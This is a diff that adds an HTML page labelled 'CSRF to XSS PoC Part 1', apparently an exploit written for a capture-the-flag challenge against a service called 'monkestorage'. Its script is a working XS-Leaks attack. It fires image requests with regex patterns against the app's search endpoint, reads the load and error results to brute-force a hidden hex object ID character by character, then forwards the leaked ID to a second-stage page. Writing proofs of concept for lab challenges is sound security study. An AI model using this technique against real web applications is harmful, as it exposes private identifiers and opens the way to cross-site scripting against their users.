@@ -1,0 +1,53 @@
+<html>
+    <body>
+        <h1>CSRF to XSS PoC Part 1</h1>
+
+        <div id="xsleaks-imgs"></div>
+
+        <script>
+            var shareKey = 'ff373618fbefa19991f1e123';
+            var target = `http://monkestorage:3000/view/${shareKey}?redirect_to=True&search=`;
+
+            var chars = 'abcdef0123456789';
+            var knownId = '';
+            var found = false;
+            var tasks = [];
+
+            function tryChar(f, c) {
+                return new Promise((res, rej) => {
+                    var div = document.getElementById('xsleaks-imgs');
+                    var img = document.createElement('img');
+                    img.src = target + '^' + f + c + '[a-f0-9]*$';
+                    img.onload = () => res(c);
+                    img.onerror = () => rej();
+                    div.appendChild(img);
+                })
+            }
+
+            async function getObjectId(f) {
+                var temp = "";
+                found = false;
+                tasks = [];
+                var c = "";
+                for (var i = 0; i < chars.length; i++) {
+                    c = chars[i];
+                    tasks.push(tryChar(f, c).then((result) => {
+                        temp = result;
+                        found = true;
+                    }).catch(() => {}))
+                }
+
+                await Promise.all(tasks);
+
+                knownId = knownId + temp;
+                if (!found) {
+                    window.location = `/csrf2.html?knownId=${knownId}`
+                    return
+                }
+                getObjectId(knownId);
+            }
+            
+            setTimeout(() => getObjectId(knownId), 2000);
+        </script>
+    </body>
+</html>
